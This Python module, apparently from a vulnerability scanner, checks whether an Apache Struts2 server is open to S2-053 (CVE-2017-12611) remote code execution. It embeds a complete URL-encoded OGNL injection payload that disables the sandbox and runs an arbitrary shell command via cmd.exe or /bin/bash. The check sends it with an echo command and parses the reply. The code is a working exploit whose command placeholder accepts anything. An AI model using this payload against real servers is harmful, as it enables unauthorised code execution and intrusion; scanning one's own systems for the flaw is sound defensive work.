#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_053_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-053漏洞,又名CVE-2017-12611漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1',
            'date': '2017-09-06',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded",
        }
        self.payload = '''%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3D'{cmd}').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe'%2C'%2Fc'%2C%23cmd%7D%3A%7B'%2Fbin%2Fbash'%2C'-c'%2C%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7D%0A'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        try:
            self.check_payload = self.payload.format(cmd = urlencode('echo ' + self.capta))
            post_data = 'message={data}'.format(data = self.check_payload)
            check_req = await request.post(self.url, headers = self.headers, data = post_data)
            check_str = re.sub('\n', '', await check_req.text())
            result = re.findall('<input type="hidden" name="(.*?)" value="" id=".*?"/>', check_str)
            if self.capta in result[0]:
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_053 = S2_053_BaseVerify('http://localhost:8080/s2_053_war_exploded/index.action')





